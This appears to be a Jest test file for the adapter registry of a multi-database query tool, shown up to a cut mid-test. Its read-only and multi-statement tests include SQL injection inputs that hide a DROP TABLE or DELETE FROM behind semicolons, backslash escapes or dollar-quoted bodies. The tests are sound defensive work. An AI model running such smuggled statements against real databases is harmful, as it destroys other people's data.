import { mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  AdapterRegistry, TimeoutError, DEFAULT_TIMEOUT, TIMEOUT_GRACE_MS,
  normaliseCacheKey, isDeadConnectionError, isTimeoutError, isSerializationError,
  classifyError, suggestionFor, registryError, collectTableReferences, stripLiterals,
  driverFor, SUPPORTED_PROTOCOLS, ROUTES, ERROR_KINDS, REPORTED_ENV,
} from '../src/core/registry.js';
import { ProfileStore } from '../src/core/profiles.js';
import { DEFAULT_ALLOWED_SCHEMES } from '../src/core/policy.js';
import { DEFAULT_MAX_ROWS, DEFAULT_MAX_BYTES, clampResult, resolvedTimezone } from '../src/core/result-limits.js';
import { callbackWithTimeout } from '../src/core/timeout-utils.js';
import { PostgresAdapter } from '../src/adapters/postgres.js';
import { SQLiteAdapter } from '../src/adapters/sqlite.js';

describe('AdapterRegistry', () => {
  let registry;

  beforeEach(() => {
    registry = new AdapterRegistry();
  });

  const stubAdapter = (overrides = {}) => ({
    connect: jest.fn().mockResolvedValue(undefined),
    execute: jest.fn().mockResolvedValue([{ ok: 1 }]),
    describe: jest.fn().mockResolvedValue({ database: 'postgresql', tables: [] }),
    close: jest.fn().mockResolvedValue(undefined),
    abort: jest.fn(),
    isHealthy: jest.fn().mockResolvedValue(true),
    ...overrides
  });

  /** The error a call rejected with, or a failure saying it did not reject. */
  const errorFrom = async (promise) => {
    try {
      await promise;
    } catch (error) {
      return error;
    }
    throw new Error('expected the call to reject, and it resolved');
  };

  /**
   * Registry wired to a scriptable adapter. `extractProtocol` is deliberately not
   * stubbed: the routing tests are for the real scheme parser.
   */
  const registryWith = (adapter, schemes = ['postgres']) => {
    const r = new AdapterRegistry();
    r.mapping = Object.fromEntries(schemes.map((scheme) => [scheme, () => adapter]));
    return r;
  };

  /** A `db.json` in a temporary directory, and a store that reads it. */
  const profileStore = (document) => {
    const dir = mkdtempSync(join(tmpdir(), 'anydb-registry-'));
    const file = join(dir, 'db.json');
    writeFileSync(file, JSON.stringify(document), 'utf8');
    return {
      file,
      store: new ProfileStore({ env: { ANYDB_CONFIG: file, ANYDB_ALLOW_PRIVATE_HOSTS: '1' } })
    };
  };

  describe('constants', () => {
    test('default timeout is 30s', () => {
      expect(DEFAULT_TIMEOUT).toBe(30000);
    });

    test('the grace window is non-zero', () => {
      expect(TIMEOUT_GRACE_MS).toBeGreaterThan(0);
    });
  });

  describe('extractProtocol', () => {
    test.each([
      'postgres://test', 'postgresql://test', 'mongodb://test', 'mongodb+srv://test',
      'mariadb://test', 'sqlite://test', 'redis://test', 'rediss://test', 'mysql://test',
      'mysql+pymysql://test', 'mariadb+pymysql://test', 'sqlite+pysqlite://test',
    ])('extracts the scheme from %s', (uri) => {
      expect(registry.extractProtocol(uri)).toBe(uri.split('://')[0]);
    });

    test('lowercases the scheme', () => {
      expect(registry.extractProtocol('POSTGRES://test')).toBe('postgres');
    });

    test('rejects a URI with no scheme', () => {
      expect(() => registry.extractProtocol('invalid-uri'))
        .toThrow("Invalid URI format. Expected 'protocol://...'");
    });

    test('rejects a non-string', () => {
      expect(() => registry.extractProtocol(42)).toThrow('Invalid URI format');
    });
  });

  describe('routing', () => {
    // `mariadb` is a package keyword, a policy.js default scheme and a profiles.js
    // driver, so a valid db.json has to route.
    test.each(['mariadb', 'mysql+pymysql', 'mysql+mysqldb', 'mysql+asyncmy', 'mysql+aiohttp'])(
      'routes %s to the MySQL factory', (scheme) => {
        expect(registry.mapping[scheme]).toBe(registry.mapping.mysql);
        expect(driverFor(scheme)).toBe('mysql');
      }
    );

    // mongodb+srv is the connection string Atlas hands out.
    test.each(['mongodb', 'mongodb+srv'])('routes %s to the MongoDB factory', (scheme) => {
      expect(registry.mapping[scheme]).toBe(registry.mapping.mongodb);
      expect(driverFor(scheme)).toBe('mongodb');
    });

    test('every scheme in ROUTES has a factory, and the aliases share one', () => {
      // Compared by identity, not by instantiating: the claim is which factory a
      // scheme reaches. `registry_integration.test.js` does the instantiation.
      const drivers = new Set(ROUTES.map((route) => route.driver));
      expect(drivers.size).toBe(5);
      for (const route of ROUTES) {
        for (const scheme of route.schemes) {
          expect(typeof registry.mapping[scheme]).toBe('function');
          expect(registry.mapping[scheme]).toBe(registry.mapping[route.driver]);
          expect(driverFor(scheme)).toBe(route.driver);
        }
      }
      expect(SUPPORTED_PROTOCOLS).toContain('mariadb');
      expect(SUPPORTED_PROTOCOLS).toContain('mongodb+srv');
    });

    test('the policy allowlist and the routed schemes agree', () => {
    // A scheme the registry routes but the policy refuses is confusing; the
    // reverse validates and then cannot run.
      for (const scheme of SUPPORTED_PROTOCOLS) {
        expect(DEFAULT_ALLOWED_SCHEMES).toContain(scheme);
      }
    });
  });

  describe('validate', () => {
    test('accepts a normal query', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', {})).not.toThrow();
    });

    test.each([undefined, null, 123, {}, [], ''])('rejects query %p', (query) => {
      expect(() => registry.validate(query, 'postgres', {}))
        .toThrow('Query must be a non-empty string.');
    });

    test('rejects a whitespace-only query', () => {
      expect(() => registry.validate('   ', 'postgres', {}))
        .toThrow('Query must be a non-empty string.');
    });

    test.each([
      'SELECT 1; DROP TABLE users',
      'SELECT 1;SELECT 2',
      'SELECT 1;\nDROP TABLE users',
      'SELECT 1 ; ; SELECT 2'
    ])('rejects multiple statements: %s', (query) => {
      // PostgreSQL's simple query protocol runs every statement in the string,
      // so a trailing write would pass a check that reads only the first keyword.
      expect(() => registry.validate(query, 'postgres', {}))
        .toThrow('Multiple statements in one call are not supported');
    });

    test.each([
      ['SELECT 1;', 'a single trailing semicolon'],
      ["SELECT ';' AS s", 'a semicolon inside a literal'],
      ['SELECT 1 -- ; DROP TABLE t', 'a semicolon inside a comment'],
      ['SELECT "a;b" FROM t', 'a semicolon inside a quoted identifier']
    ])('accepts %s (%s)', (query) => {
      expect(() => registry.validate(query, 'postgres', {})).not.toThrow();
    });

    test('the multi-statement check does not apply to MongoDB or Redis', () => {
      expect(() => registry.validate('{"a":"b;c"}', 'mongodb', { collection: 'c' })).not.toThrow();
      expect(() => registry.validate('GET a;b', 'redis', {})).not.toThrow();
    });

    // mariadb and mongodb+srv reach the guards collapsed, or safety.js would
    // answer "protocol cannot be verified" for an ordinary MariaDB query.
    test.each(['postgres', 'mysql', 'mariadb', 'sqlite', 'mysql+pymysql'])(
      'applies the multi-statement check to %s', (protocol) => {
        expect(() => registry.validate('SELECT 1; SELECT 2', protocol, {}))
          .toThrow('Multiple statements');
      }
    );

    test('mongodb+srv needs a collection like mongodb', () => {
      expect(() => registry.validate('{}', 'mongodb+srv', {}))
        .toThrow("Missing 'collection' parameter for MongoDB query.");
      expect(() => registry.validate('{}', 'mongodb+srv', { collection: 'c' })).not.toThrow();
    });

    test('requires a collection for MongoDB', () => {
      expect(() => registry.validate('{}', 'mongodb', {}))
        .toThrow("Missing 'collection' parameter for MongoDB query.");
      expect(() => registry.validate('{}', 'mongodb', { collection: 'users' })).not.toThrow();
    });

    test('rejects an unknown MongoDB action by name', () => {
      expect(() => registry.validate('{}', 'mongodb', { collection: 'c', action: 'drop' }))
        .toThrow(/Unknown MongoDB action "drop"/);
    });

    test.each([0, -1, -1000, 86400001])('rejects out-of-range timeout %p', (timeout) => {
      expect(() => registry.validate('SELECT 1', 'postgres', { timeout }))
        .toThrow(/Timeout must be between/);
    });

    test.each(['5000', true, {}, [], NaN, Infinity])('rejects non-finite timeout %p', (timeout) => {
      expect(() => registry.validate('SELECT 1', 'postgres', { timeout }))
        .toThrow(/Timeout must be a number/);
    });

    // 1.5 passed `Number.isFinite` and the range check, and reached
    // `SET statement_timeout = 1.5`.
    test.each([1.5, 0.001, 1000.0001, 2.0000001])('rejects non-integer timeout %p', (timeout) => {
      expect(() => registry.validate('SELECT 1', 'postgres', { timeout }))
        .toThrow(/Timeout must be a whole number of milliseconds/);
    });

    test.each([1, 1000, 30000, 86400000])('accepts timeout %p', (timeout) => {
      expect(() => registry.validate('SELECT 1', 'postgres', { timeout })).not.toThrow();
    });

    test('the cheap numeric check runs before the semicolon scan', () => {
      // A caller who wrote `timeout: 1.5` has to be told about 1.5, not about a
      // semicolon they are going to rewrite the statement to remove anyway.
      expect(() => registry.validate('SELECT 1; SELECT 2', 'postgres', { timeout: 1.5 }))
        .toThrow(/whole number of milliseconds/);
    });

    test('rejects a non-boolean readOnly', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', { readOnly: 'yes' }))
        .toThrow("'readOnly' must be a boolean");
    });

    test('accepts a boolean readOnly', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', { readOnly: false })).not.toThrow();
      expect(() => registry.validate('SELECT 1', 'postgres', { readOnly: true })).not.toThrow();
    });

    test.each(['readOnly', 'allowDestructive', 'allowWriteStages', 'upsert'])(
      'rejects a non-boolean %s', (key) => {
        expect(() => registry.validate('SELECT 1', 'postgres', { [key]: 'true' }))
          .toThrow(new RegExp(`'${key}' must be a boolean`));
      }
    );

    test('rejects params that are not an array', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', { params: { a: 1 } }))
        .toThrow("'params' must be an array of values");
      expect(() => registry.validate('SELECT 1', 'postgres', { params: '1' }))
        .toThrow("'params' must be an array of values");
      expect(() => registry.validate('SELECT 1', 'postgres', { params: [1, 'x'] })).not.toThrow();
    });

    test.each(['json', 'jsonl', 'csv', 'tsv', 'markdown'])('accepts format %s', (format) => {
      expect(() => registry.validate('SELECT 1', 'postgres', { format })).not.toThrow();
    });

    test('rejects an unknown format', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', { format: 'yaml' }))
        .toThrow(/'format' must be one of json, jsonl, csv, tsv, markdown/);
    });

    test.each(['maxRows', 'maxBytes'])('rejects a bad %s', (key) => {
      for (const value of [0, -1, 1.5, '10', NaN, Infinity, true, null]) {
        if (value === null) {
          expect(() => registry.validate('SELECT 1', 'postgres', { [key]: value })).not.toThrow();
          continue;
        }
        expect(() => registry.validate('SELECT 1', 'postgres', { [key]: value }))
          .toThrow(new RegExp(`'${key}' must be a positive whole number`));
      }
      expect(() => registry.validate('SELECT 1', 'postgres', { [key]: 1 })).not.toThrow();
    });

    test('rejects a negative or fractional offset', () => {
      expect(() => registry.validate('SELECT 1', 'postgres', { offset: -1 }))
        .toThrow(/'offset' must be a whole number of rows to skip, zero or more/);
      expect(() => registry.validate('SELECT 1', 'postgres', { offset: 1.5 }))
        .toThrow(/'offset' must be a whole number/);
      expect(() => registry.validate('SELECT 1', 'postgres', { offset: 0 })).not.toThrow();
    });

    test('rejects a non-positive limit', () => {
      for (const value of [0, -1, 1.5, '10']) {
        expect(() => registry.validate('SELECT 1', 'postgres', { limit: value }))
          .toThrow(/'limit' must be a positive whole number/);
      }
      expect(() => registry.validate('SELECT 1', 'postgres', { limit: 10 })).not.toThrow();
    });

    test('an argument error is a validation error with a code', () => {
      let error;
      try {
        registry.validate('SELECT 1', 'postgres', { timeout: 1.5 });
      } catch (caught) {
        error = caught;
      }
      expect(error).toBeDefined();
      expect(error.kind).toBe('validation');
      expect(error.code).toBe('INVALID_TIMEOUT');
    });
  });

  describe('timeout resolution', () => {
    test('falls back to the default when omitted', () => {
      expect(registry.resolveTimeout({})).toBe(DEFAULT_TIMEOUT);
      expect(registry.resolveTimeout({ timeout: null })).toBe(DEFAULT_TIMEOUT);
    });

    test('uses the supplied value', () => {
      expect(registry.resolveTimeout({ timeout: 5000 })).toBe(5000);
    });

    test('a policy queryTimeoutMs wins over the default', () => {
      expect(registry.resolveTimeout({}, { queryTimeoutMs: 1234 })).toBe(1234);
    });
  });

  describe('read-only resolution', () => {
    test('defaults to read-only', () => {
      expect(registry.resolveReadOnly({})).toBe(true);
      expect(registry.resolveReadOnly({ readOnly: true })).toBe(true);
    });

    test('opts out only on an explicit false', () => {
      expect(registry.resolveReadOnly({ readOnly: false })).toBe(false);
    });

    test('a profile readOnly:false opts out with no per-call argument', () => {
      expect(registry.resolveReadOnly({}, { readOnly: false })).toBe(false);
    });
  });

  describe('run', () => {
    test('rejects an unsupported protocol', async () => {
      await expect(registry.run('unknown://localhost', 'SELECT 1'))
        .rejects.toThrow(/Protocol "unknown" is not supported/);
    });

    test.each([
      'rediss://host',
      'mysql+pymysql://u:p@h/d',
      'mysql+asyncmy://u:p@h/d',
      'sqlite+pysqlite:///path.db',
      'mariadb://u:p@h/d',
      'mongodb+srv://u:p@cluster.example/d'
    ])('routes %s', async (uri) => {
      // These appear in SQLAlchemy connection strings and in Atlas, so the
      // registry has to reach them before the adapter normalises the scheme.
      const factory = jest.fn(() => stubAdapter());
      const r = new AdapterRegistry();
      r.mapping = { [r.extractProtocol(uri)]: factory };

      const query = r.extractProtocol(uri).startsWith('mongodb') ? '{}' : 'SELECT 1';
      const options = { readOnly: false, allowDestructive: true };
      if (r.extractProtocol(uri).startsWith('mongodb')) options.collection = 'c';

      await r.run(uri, query, options);
      expect(factory).toHaveBeenCalled();
    });

    test('rejects a missing or non-string uri', async () => {
      await expect(registry.run(undefined, 'SELECT 1'))
        .rejects.toThrow(/no "profile" and no "uri"/);
      await expect(registry.run(42, 'SELECT 1'))
        .rejects.toThrow(/no "profile" and no "uri"/);
    });

    test('rejects an empty uri', async () => {
      await expect(registry.run('', 'SELECT 1')).rejects.toThrow(/no "profile" and no "uri"/);
    });

    test('the missing-target message names both arguments', async () => {
      await expect(registry.run(undefined, 'SELECT 1')).rejects.toThrow(/"profile"/);
      await expect(registry.run(undefined, 'SELECT 1')).rejects.toThrow(/"uri"/);
    });

    test('keeps the connection for reuse', async () => {
      const adapter = stubAdapter();

      const envelope = await registryWith(adapter).run('postgres://x', 'SELECT 1');
      expect(envelope.rows).toEqual([{ ok: 1 }]);
      expect(envelope.rowCount).toBe(1);
      expect(adapter.connect).toHaveBeenCalledTimes(1);
      expect(adapter.execute).toHaveBeenCalledTimes(1);
      // Closing per call was what made sqlite://:memory: useless; the cache
      // now owns the lifetime.
      expect(adapter.close).not.toHaveBeenCalled();
    });

    test('a second call reuses the connection', async () => {
      const adapter = stubAdapter();
      const r = registryWith(adapter);

      await r.run('postgres://x', 'SELECT 1');
      await r.run('postgres://x', 'SELECT 2');

      expect(adapter.connect).toHaveBeenCalledTimes(1);
      expect(adapter.execute).toHaveBeenCalledTimes(2);
    });

    test('a bad statement keeps the connection', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new Error('no such table: t'))
      });

      await expect(registryWith(adapter).run('postgres://x', 'SELECT * FROM t'))
        .rejects.toThrow('no such table');
      // A bad query says nothing about the connection, so it stays cached.
      expect(adapter.close).not.toHaveBeenCalled();
    });

    test('a dropped connection is evicted', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new Error('read ECONNRESET'))
      });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1')).rejects.toThrow();
      expect(adapter.close).toHaveBeenCalled();
      expect(r.cache.size).toBe(0);
    });

    test('a timed-out connection is torn down', async () => {
      // SQLite keeps running a statement the caller has given up on, so a cached
      // connection that timed out would make every later query queue behind it.
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new TimeoutError('sqlite query', 200))
      });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1')).rejects.toThrow(/timed out after 200ms/);
      expect(adapter.abort).toHaveBeenCalled();
      expect(r.cache.size).toBe(0);
    });

    // The connection is gone and each of these carries no code, which is the only
    // situation the message list is for.
    test.each([
      'server closed the connection unexpectedly',
      'Connection terminated unexpectedly',
      'terminating connection due to administrator command',
      'this socket has been ended by the other party',
      'Connection pool was closed',
      'read ECONNRESET',
    ])('discards the connection for %p', async (message) => {
      const adapter = stubAdapter({ execute: jest.fn().mockRejectedValue(new Error(message)) });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1')).rejects.toThrow();
      expect(adapter.abort).toHaveBeenCalled();
      expect(r.cache.size).toBe(0);
    });

    // The code is the signal, and the adapters keep it one link down: each of these
    // is the error the adapter builds, whose `cause` is the driver's original.
    // The message is prose this codebase wrote, so matching it matched ourselves.
    test.each([
      ['PostgreSQL statement_timeout', '57014', '[Postgres timeout] Query exceeded 30000ms (statement_timeout)'],
      ['MySQL max_execution_time', 'ER_QUERY_TIMEOUT', 'MySQL query exceeded 30000ms timeout: interrupted'],
      ['SQLite interrupt', 'SQLITE_INTERRUPT', 'SQLITE_INTERRUPT: interrupted'],
    ])('%s is a dead connection by its code, not its wording', async (_name, code, message) => {
      const driverError = Object.assign(new Error('the driver said so'), { code });
      const adapter = stubAdapter({ execute: jest.fn().mockRejectedValue(new Error(message, { cause: driverError })) });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1')).rejects.toThrow();
      expect(adapter.abort).toHaveBeenCalled();
      expect(r.cache.size).toBe(0);
    });

    // MongoDB's `50` is not a dead connection: the server aborted one operation and
    // the socket is untouched. Matching the wording `mongodb.js` writes would evict
    // on every slow aggregation, with nothing behind it.
    test('a MongoDB maxTimeMS abort keeps the connection, and is still a timeout', async () => {
      const driverError = Object.assign(new Error('operation exceeded time limit'), { code: 50 });
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new Error('[MongoDB timeout] Query exceeded 30000ms (maxTimeMS)', { cause: driverError }))
      });
      const r = registryWith(adapter);

      const error = await errorFrom(r.run('postgres://x', 'SELECT 1'));
      expect(error.kind).toBe('timeout');
      expect(error.code).toBe(50);
      expect(adapter.abort).not.toHaveBeenCalled();
      expect(r.cache.size).toBe(1);
    });

    test('a socket timeout is a dead connection, because the socket is', async () => {
      // `ETIMEDOUT` is a *socket* error and there is no socket left, so it evicts;
      // a code meaning "the server stopped this one statement" does not.
      const driverError = Object.assign(new Error('read ETIMEDOUT'), { code: 'ETIMEDOUT' });
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new Error('[Postgres error] timeout exceeded', { cause: driverError }))
      });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1')).rejects.toThrow();
      expect(adapter.abort).toHaveBeenCalled();
      expect(r.cache.size).toBe(0);
    });

    // A table called `timeout` is not a timeout.
    test('a column named timeout does not evict the connection', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockRejectedValue(new Error('column "timeout" does not exist'))
      });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT timeout FROM jobs'))
        .rejects.toThrow('does not exist');
      expect(adapter.abort).not.toHaveBeenCalled();
      expect(adapter.close).not.toHaveBeenCalled();
      expect(r.cache.size).toBe(1);
    });

    test('a unique index on a field named timeout does not evict the connection', async () => {
      const duplicate = new Error(
        'E11000 duplicate key error collection: app.jobs index: timeout_1 dup key: { timeout: 0 }'
      );
      duplicate.code = 11000;
      const adapter = stubAdapter({ execute: jest.fn().mockRejectedValue(duplicate) });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1'))
        .rejects.toThrow('E11000 duplicate key error');
      expect(adapter.abort).not.toHaveBeenCalled();
      expect(r.cache.size).toBe(1);
    });

    test('a failed connect is reported', async () => {
      const adapter = stubAdapter({
        connect: jest.fn().mockRejectedValue(new Error('no route to host'))
      });

      await expect(registryWith(adapter).run('postgres://x', 'SELECT 1'))
        .rejects.toThrow('no route to host');
    });

    test('passes the resolved timeout to the adapter factory', async () => {
      const factory = jest.fn(() => stubAdapter());
      const r = new AdapterRegistry();
      r.mapping = { postgres: factory };

      await r.run('postgres://x', 'SELECT 1', { timeout: 1234 });
      expect(factory).toHaveBeenCalledWith(1234);
    });

    // The cache does not stamp the budget onto the adapter, so a call that omits
    // `timeout` would inherit the previous call's.
    test('passes the resolved timeout into the per-call options', async () => {
      const adapter = stubAdapter();
      await registryWith(adapter).run('postgres://x', 'SELECT 1', { timeout: 1234 });
      expect(adapter.execute).toHaveBeenCalledWith('SELECT 1', expect.objectContaining({ timeout: 1234 }));
    });

    test('passes the default timeout into the per-call options too', async () => {
      const adapter = stubAdapter();
      await registryWith(adapter).run('postgres://x', 'SELECT 1');
      expect(adapter.execute).toHaveBeenCalledWith('SELECT 1', expect.objectContaining({ timeout: DEFAULT_TIMEOUT }));
    });

    test('reports a timeout and aborts the underlying work', async () => {
      const adapter = stubAdapter({
        execute: jest.fn(() => new Promise(() => {})) // never settles
      });

      await expect(registryWith(adapter).run('postgres://x', 'SELECT 1', { timeout: 60 }))
        .rejects.toThrow(TimeoutError);
      // Without this the abandoned query keeps running on the server.
      expect(adapter.abort).toHaveBeenCalled();
    });

    test('an aborted connection leaves the cache', async () => {
      const adapter = stubAdapter({
        execute: jest.fn(() => new Promise(() => {}))
      });
      const r = registryWith(adapter);

      await expect(r.run('postgres://x', 'SELECT 1', { timeout: 60 }))
        .rejects.toThrow(TimeoutError);
      // A torn-down connection must not be handed to the next caller.
      expect(r.cache.size).toBe(0);
    });

    test('a late failure is not an unhandled rejection', async () => {
      const keepAlive = setTimeout(() => {}, 1200);
      const adapter = stubAdapter({
        // Rejects well after the guard has fired, so the abandoned work still
        // completes and rejects with nobody listening.
        execute: jest.fn(() => new Promise((_, reject) =>
          setTimeout(() => reject(new Error('connection lost')), 800)))
      });

      try {
        await expect(registryWith(adapter).run('postgres://x', 'SELECT 1', { timeout: 40 }))
          .rejects.toThrow(TimeoutError);
        await new Promise(r => setTimeout(r, 1000)); // let the rejection land
      } finally {
        clearTimeout(keepAlive);
      }
    });

    test('an adapter timeout beats the outer guard', async () => {
      const adapter = stubAdapter({
        execute: jest.fn(async () => {
          await new Promise((_, reject) =>
            setTimeout(() => reject(new Error('statement_timeout')), 30));
        })
      });

      await expect(registryWith(adapter).run('postgres://x', 'SELECT 1', { timeout: 1000 }))
        .rejects.toThrow('statement_timeout');
    });
  });

  describe('result clamping and the envelope', () => {
    test('clamps by maxRows and says so', async () => {
      const rows = Array.from({ length: 50 }, (_, i) => ({ i }));
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue(rows) });

      const envelope = await registryWith(adapter).run('postgres://x', 'SELECT 1', { maxRows: 10 });

      expect(envelope.rowCount).toBe(10);
      expect(envelope.rows).toHaveLength(10);
      expect(envelope.truncated).toBe(true);
      expect(envelope.limitReason).toBe('maxRows');
      expect(envelope.hint).toMatch(/LIMIT/);
      expect(envelope.hint).toMatch(/40 row\(s\) were dropped/);
    });

    test('clamps by maxBytes, and drops a single oversized row rather than returning it', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockResolvedValue([{ blob: 'x'.repeat(5000) }])
      });

      const envelope = await registryWith(adapter).run('postgres://x', 'SELECT blob FROM t', { maxBytes: 100 });

      expect(envelope.rows).toEqual([]);
      expect(envelope.rowCount).toBe(0);
      expect(envelope.truncated).toBe(true);
      expect(envelope.limitReason).toBe('maxBytes');
      expect(envelope.bytes).toBeLessThanOrEqual(100);
    });

    test('an untruncated result carries every envelope field', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ a: 1 }]) });
      const { store } = profileStore({
        profiles: { prod: { driver: 'postgres', uri: 'postgres://app@db.example.com:5432/mydb', readOnly: true } }
      });
      const r = new AdapterRegistry({
        env: { ANYDB_ALLOW_PRIVATE_HOSTS: '1' },
        profiles: store
      });
      r.mapping = { postgres: () => adapter };

      const envelope = await r.run({ profile: 'prod' }, 'SELECT 1');

      expect(envelope).toEqual({
        rows: [{ a: 1 }],
        rowCount: 1,
        truncated: false,
        bytes: expect.any(Number),
        elapsedMs: expect.any(Number),
        profile: 'prod',
        driver: 'postgres',
        limitReason: null,
        nextCursor: null,
        timezone: expect.stringMatching(/^[+-]\d{2}:\d{2}$/),
        hint: null
      });
    });

    test('a status object for a write keeps its documented shape inside rows', async () => {
      const adapter = stubAdapter({
        execute: jest.fn().mockResolvedValue([{ affectedRows: 3, insertId: 7, changedRows: 1 }])
      });

      const envelope = await registryWith(adapter).run('postgres://x', 'INSERT INTO t VALUES (1)', {
        readOnly: false, allowDestructive: true
      });

      expect(envelope.rows).toEqual([{ affectedRows: 3, insertId: 7, changedRows: 1 }]);
    });

    test('a value JSON cannot serialise is normalised, not thrown', async () => {
// Without `normalizeForJson` this is `TypeError: Do not know how to serialize a
    // BigInt`, reported to the model as a postgres syntax error.
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ id: 9007199254740993n }]) });

      const envelope = await registryWith(adapter).run('postgres://x', 'SELECT id FROM t');

      expect(envelope.rows).toEqual([{ id: '9007199254740993' }]);
      expect(() => JSON.stringify(envelope)).not.toThrow();
    });

    test('a bigint never reaches the caller as a TypeError', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ n: 1n }]) });
      await expect(registryWith(adapter).run('postgres://x', 'SELECT 1')).resolves.toBeDefined();
    });
  });

  describe('describe', () => {
    test('returns the description inside the envelope without running caller SQL', async () => {
      const adapter = stubAdapter({
        describe: jest.fn().mockResolvedValue({ database: 'postgresql', tables: [] })
      });

      const envelope = await registryWith(adapter).describe('postgres://x');
      expect(envelope.rows).toEqual({ database: 'postgresql', tables: [] });
      expect(envelope.rowCount).toBe(1);
      expect(envelope.truncated).toBe(false);
      expect(adapter.execute).not.toHaveBeenCalled();
    });

    test('rejects a missing uri', async () => {
      await expect(registry.describe()).rejects.toThrow(/no "profile" and no "uri"/);
      await expect(registry.describe('')).rejects.toThrow(/no "profile" and no "uri"/);
    });

    test('rejects an unsupported protocol', async () => {
      await expect(registry.describe('oracle://h')).rejects.toThrow(/not supported/);
    });

    test.each(['table', 'collection'])('rejects a non-string %s', async (key) => {
      await expect(registry.describe('postgres://x', { [key]: 5 }))
        .rejects.toThrow(`'${key}' must be a string`);
    });

    test('accepts a string table or collection', async () => {
      const adapter = stubAdapter({ describe: jest.fn().mockResolvedValue({ tables: [] }) });
      const r = registryWith(adapter);

      await r.describe('postgres://x', { table: 'users' });
      expect(adapter.describe).toHaveBeenCalledWith(expect.objectContaining({ table: 'users' }));
    });

    // `describe()` has no query of its own, so the resolved timeout has to travel
    // in the options for the same reason it does in `run()`.
    test('passes the resolved timeout into describe', async () => {
      const adapter = stubAdapter({ describe: jest.fn().mockResolvedValue({ tables: [] }) });
      await registryWith(adapter).describe('postgres://x', { timeout: 4321 });
      expect(adapter.describe).toHaveBeenCalledWith(expect.objectContaining({ timeout: 4321 }));
    });

    test('times out like db_query does', async () => {
      const adapter = stubAdapter({ describe: jest.fn(() => new Promise(() => {})) });

      await expect(registryWith(adapter).describe('postgres://x', { timeout: 60 }))
        .rejects.toThrow(/db_schema \(postgres\).*timed out/);
    });

    // `describe()` skips the query half of `validate()`, so the timeout is checked
    // here: a negative value turns the guard off, a huge one overflows Node's
    // 32-bit timer.
    test.each([
      ['abc', /must be a number of milliseconds, got abc/],
      [-5, /must be between 1 and 86400000/],
      [0, /must be between 1 and 86400000/],
      [1e18, /must be between 1 and 86400000/],
      [NaN, /must be a number of milliseconds, got NaN/],
      [Infinity, /must be a number of milliseconds, got Infinity/],
      [1.5, /must be a whole number of milliseconds, got 1.5/]
    ])('rejects timeout %p', async (timeout, expected) => {
      const adapter = stubAdapter({ describe: jest.fn().mockResolvedValue({ tables: [] }) });
      const r = registryWith(adapter);

      await expect(r.describe('postgres://x', { timeout })).rejects.toThrow(expected);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    test.each([[null], [undefined], [5000]])('accepts timeout %p', async (timeout) => {
      const adapter = stubAdapter({ describe: jest.fn().mockResolvedValue({ tables: [] }) });
      await expect(registryWith(adapter).describe('postgres://x', { timeout })).resolves.toBeDefined();
    });
  });

  describe('read-only enforcement in run', () => {
    test('blocks a destructive statement before connecting', async () => {
      const adapter = stubAdapter();
      await expect(registryWith(adapter).run('postgres://x', 'DROP TABLE users'))
        .rejects.toThrow(/Read-only mode/);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    test('the rejection names the way out', async () => {
      await expect(registryWith(stubAdapter()).run('postgres://x', 'DROP TABLE users'))
        .rejects.toThrow(/readOnly:\s*false/);
    });

    test('blocks a Redis write for a redis URI', async () => {
      await expect(registryWith(stubAdapter(), ['redis']).run('redis://x', 'FLUSHDB'))
        .rejects.toThrow(/Read-only mode/);
    });

    test('allows a DML write when readOnly is explicitly false', async () => {
      const adapter = stubAdapter({ execute: jest.fn().mockResolvedValue([{ affectedRows: 1 }]) });
      const envelope = await registryWith(adapter).run('postgres://x', 'DELETE FROM drafts', {
        readOnly: false
      });
      expect(envelope.rows).toEqual([{ affectedRows: 1 }]);
    });

    // The read-only verdict looks only at the leading keyword, which is SELECT
    // here. What stops the DROP is the multiple-statement check, and it only
    // works if the scanner ends the literal where the server ends it.
    test.each([
      ['postgres://x', 'postgres'],
      ['postgresql://x', 'postgresql'],
      ['sqlite://:memory:', 'sqlite']
    ])('refuses a statement hidden behind a backslash on %s', async (uri, scheme) => {
      const adapter = stubAdapter();
      await expect(registryWith(adapter, [scheme]).run(uri, "SELECT 'a\\'; DROP TABLE t; --'"))
        .rejects.toThrow(/Multiple statements/);
      expect(adapter.connect).not.toHaveBeenCalled();
    });

    // A dollar-quoted body may hold an unquoted `'`, so a scanner that opens a
    // literal there finds no partner and swallows the rest of the statement, the
    // semicolon with it. A real bypass, because `pg` uses the *simple* query
    // protocol when `values` is empty, so a `db_query` with no `params` hands the
    // text to the server as-is.
    test.each([
      "SELECT $tag$ ' $tag$ ; DELETE FROM users; --",
      "SELECT $$ ' $$ ; DELETE FROM users; --",
      'SELECT $q$ " $q$ ; DELETE FROM users; --',
      'SELECT $b$ ` $b$ ; DROP TABLE t; --',
    ])('refuses a statement hidden behind a dollar-quoted body: %p', async (query) => {
      const adapter = stubAdapter();
      await expect(registryWith(adapter).run('postgres://x', query))
        .rejects.toThrow(/Multiple statements/);
